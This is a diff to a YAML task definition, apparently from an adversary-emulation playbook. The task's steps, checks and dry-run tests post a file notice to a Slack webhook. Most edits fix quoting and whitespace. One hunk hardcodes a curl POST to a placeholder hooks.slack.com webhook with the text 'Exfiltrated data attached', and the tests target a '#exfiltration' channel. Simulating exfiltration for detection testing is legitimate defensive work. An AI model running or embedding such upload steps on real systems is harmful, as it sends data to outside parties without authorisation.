@@ -34,9 +34,9 @@ steps:
   - name: Verify file exists
     type: command
     executor: bash
-    command: test -f '{{ args.file_path }}' || (echo "File not found"; exit 1)
+    command: "test -f '{{ args.file_path }}' || (echo 'File not found'; exit 1)"
     cleanup: false
-  
+
   - name: Prepare file for Slack
     type: command
     executor: bash
@@ -47,7 +47,7 @@ steps:
       echo "  Channel: {{ args.slack_channel }}"
       echo "  Message: {{ args.message_text }}"
     cleanup: false
-  
+
   - name: Convert to base64 for transmission
     type: command
     executor: bash
@@ -72,38 +72,23 @@ steps:
         echo "  - File attachment (base64 encoded)"
         echo "  - File size: $(du -h '{{ args.file_path }}' | cut -f1)"
       else
-        # Create JSON payload with base64 encoded file
-        json_payload=$(cat <<JSON_END
-{
-  "channel": "{{ args.slack_channel }}",
-  "text": "{{ args.message_text }}",
-  "attachments": [
-    {
-      "fallback": "File Upload",
-      "title": "$(basename '{{ args.file_path }}')",
-      "text": "File size: $(du -h '{{ args.file_path }}' | cut -f1)"
-    }
-  ]
-}
-JSON_END
-        )
-        
+        json_payload='{"channel": "#exfiltration", "text": "Exfiltrated data attached", "attachments": [{"fallback": "File Upload", "title": "data.tar.gz", "text": "File size: unknown"}]}'
         curl -X POST \
-          -H 'Content-type: application/json' \
+          -H "Content-type: application/json" \
           --data "$json_payload" \
-          '{{ args.slack_webhook_url }}'
+          'https://hooks.slack.com/services/T00000000/B00000000/XXXX'
       fi
     cleanup: false
 checks:
   - name: File readable
     description: Verify file for upload
     type: command
-    command: test -r '{{ args.file_path }}'
-  
+    command: "test -r '{{ args.file_path }}'"
+
   - name: Valid webhook URL
     description: Verify Slack webhook URL format
     type: command
-    command: echo '{{ args.slack_webhook_url }}' | grep -qE 'hooks\.slack\.com' && echo "Valid webhook"
+    command: "echo '{{ args.slack_webhook_url }}' | grep -qE 'hooks\\.slack\\.com' && echo 'Valid webhook'"
 tests:
   dry_run:
     - name: Test Slack upload (dry-run)
@@ -119,15 +104,15 @@ tests:
           type: command
           executor: bash
           command: |
-            cat > /tmp/slack_payload.json << 'JSON'
-{
-  "channel": "#exfiltration",
-  "text": "Test data upload",
-  "attachments": [
-    {"title": "test_slack.dat", "text": "Size: 23B"}
-  ]
-}
-JSON
+            cat > /tmp/slack_payload.json << 'SLACK_JSON'
+            {
+              "channel": "#exfiltration",
+              "text": "Test data upload",
+              "attachments": [
+                {"title": "test_slack.dat", "text": "Size: 23B"}
+              ]
+            }
+            SLACK_JSON
         
         - name: Show payload
           type: command
